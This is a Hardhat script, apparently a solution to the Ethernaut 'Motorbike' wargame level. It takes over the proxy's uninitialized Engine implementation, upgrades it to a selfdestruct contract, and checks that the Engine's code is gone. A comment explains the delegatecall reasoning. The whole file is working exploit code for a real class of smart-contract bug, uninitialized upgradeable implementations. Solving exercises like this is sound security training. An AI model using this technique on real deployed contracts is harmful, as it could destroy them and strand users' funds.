import { ethers } from "hardhat";
import { BigNumber, Contract } from "ethers";
import { abi as MotorbikeABI } from "../../artifacts/contracts/25.Motorbike/Motorbike.sol/Motorbike.json";
import { abi as EngineABI } from "../../artifacts/contracts/25.Motorbike/Engine.sol/Engine.json";
import { displayResult } from "../../utils/displayResult";
import { deployContract } from "../../utils/deployContract";

const targetAddress = "0xDE71417575a51C719C7bA4D06AB0DC7A29a1BA2d";

async function main() {
  const [attacker] = await ethers.getSigners();
  // const Motorbike = new Contract(targetAddress, MotorbikeABI, attacker);
  const implementationSlot =
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
  const implementationAddress =
    "0x" +
    (
      await ethers.provider.getStorageAt(targetAddress, implementationSlot)
    ).slice(26);
  const Engine = new Contract(implementationAddress, EngineABI, attacker);

  let tx = await Engine.initialize();
  await tx.wait();

  const selfdestruct = await deployContract("Selfdestruct", attacker);
  tx = await Engine.upgradeToAndCall(selfdestruct.address, "0x11");
  await tx.wait();
  const engineCode = await ethers.provider.getCode(Engine.address);
  displayResult(engineCode === "0x");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
/*  Explanation of the code:
    When the motorbike is deployed the engine contract is initialized in the motorbike 
    context (through delegatecall). So the engine context itself hasn't been initialized
    unless its creators though about it. So we can initialize it ourselves and then
    upgrade it to a selfdestruct contract. Since the call will be done again through a
    delegatecall, the selfdestruct contract will be executed in Engine context.
    So the engine will selfdestruct.
    We can verify this by getting the code of the engine contract after the upgrade.
    if it's 0x then it means that the engine contract has been selfdestructed.
  */
